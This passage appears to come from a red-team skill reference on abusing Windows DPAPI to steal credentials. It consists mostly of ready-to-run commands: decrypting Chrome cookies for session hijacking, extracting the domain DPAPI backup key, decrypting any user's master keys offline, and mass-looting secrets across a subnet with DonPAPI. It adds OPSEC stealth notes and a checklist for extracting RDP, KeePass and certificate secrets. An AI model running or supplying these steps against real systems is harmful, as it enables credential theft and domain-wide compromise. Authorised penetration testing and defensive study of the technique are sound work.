# abusing-dpapi-for-credential-access — 详细参考（由 SKILL.md 拆分）

# Decrypt cookies (useful for session hijacking) in a target folder
SharpChrome.exe cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" /pvk:backupkey.pvk

# Resolve the AES state key explicitly
SharpChrome.exe statekeys /unprotect
```

### 6. Obtain the domain DPAPI backup key (Domain Admin)

With Domain Admin, retrieve the domain's RSA DPAPI backup private key once. This key decrypts every domain user's master keys indefinitely:

```powershell
# Pull and save the domain backup key as a .pvk via the MS-BKRP RPC interface
SharpDPAPI.exe backupkey /server:dc01.corp.local /file:backupkey.pvk
```

Then decrypt any user's master keys offline with it:

```powershell
SharpDPAPI.exe masterkeys /pvk:backupkey.pvk /target:C:\Users\alice\AppData\Roaming\Microsoft\Protect\
```

### 7. Remote / Linux-based triage (Impacket / DonPAPI)

From a Linux operator box, harvest and decrypt DPAPI secrets across hosts:

```bash
# Decrypt a single masterkey file with Impacket using the domain backup key
impacket-dpapi masterkey -file <masterkey_file> -pvk backupkey.pvk

# Decrypt a credential blob with the recovered masterkey
impacket-dpapi credential -file <cred_blob> -key 0x<decrypted_masterkey>

# Mass remote DPAPI looting across hosts with DonPAPI
donpapi collect -u alice -p 'Password123!' -d corp.local --target 10.0.0.0/24
```

## Tools and Resources

| Tool | Purpose | Link |
|------|---------|------|
| SharpDPAPI | Windows DPAPI triage/decryption (C#) | https://github.com/GhostPack/SharpDPAPI |
| SharpChrome | Chromium logins/cookies/state-key decryption | https://github.com/GhostPack/SharpDPAPI |
| Mimikatz | Original DPAPI (`dpapi::*`) implementation | https://github.com/gentilkiwi/mimikatz |
| Impacket dpapi.py | Remote/offline DPAPI decryption (Python) | https://github.com/fortra/impacket |
| DonPAPI | Mass remote DPAPI looting | https://github.com/login-securite/DonPAPI |
| HackTricks DPAPI | Technique reference | https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html |

## Detection and OPSEC Notes

- Master-key access and reads of `\Microsoft\Protect\` and `\Microsoft\Credentials\` are detectable; `backupkey` triggers an MS-BKRP RPC call to the DC.
- The `/unprotect` (online) path is the stealthiest single-host option but only works as the live user.
- Defenders should monitor for Sysmon process access to LSASS and abnormal access to Protect/Credentials folders (DE.CM-01).

## Validation Criteria

- [ ] Host triaged with `SharpDPAPI triage` / `machinetriage`.
- [ ] User master keys decrypted via `/unprotect`, `/password:`, `/ntlm:`, or `/pvk:`.
- [ ] Credential Manager and Vault secrets recovered.
- [ ] RDP / KeePass / certificate secrets extracted where present.
- [ ] Browser logins/cookies decrypted with SharpChrome.
- [ ] Domain DPAPI backup key retrieved with Domain Admin (if in scope) and reused offline.
- [ ] All recovered secrets documented with source host/user and ROE adherence confirmed.
